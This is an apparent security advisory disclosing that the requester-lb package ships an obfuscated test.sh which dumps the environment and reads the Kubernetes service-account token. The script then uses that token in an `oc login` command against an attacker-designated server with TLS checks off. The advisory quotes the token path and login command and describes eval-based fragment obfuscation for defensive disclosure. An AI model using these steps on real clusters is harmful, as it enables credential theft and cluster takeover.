summary: requester-lb ships obfuscated Kubernetes service-account token exfiltration in test.sh
details: The package ships test.sh, a shell script whose malicious payload is assembled from 20+ one- to three-character string fragments and executed via eval to evade static analysis. Once reconstructed, the script runs `printenv` (dumping the full environment), reads the in-cluster Kubernetes service-account token at /var/run/secrets/kubernetes.io/serviceaccount/token, and invokes `oc login --token=<stolen-token> --server=$SERV --insecure-skip-tls-verify` to authenticate to an attacker-designated OpenShift API server with TLS verification disabled. The README advertises only HTTP/DNS diagnostics and does not disclose any Kubernetes authentication, token read, or environment dump. The declared `main: index.js` is not present in the tarball, so `require('requester-lb')` is inert; the harmful surface is the shipped shell script and CLI, which is the documented way users are directed to invoke the tool.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
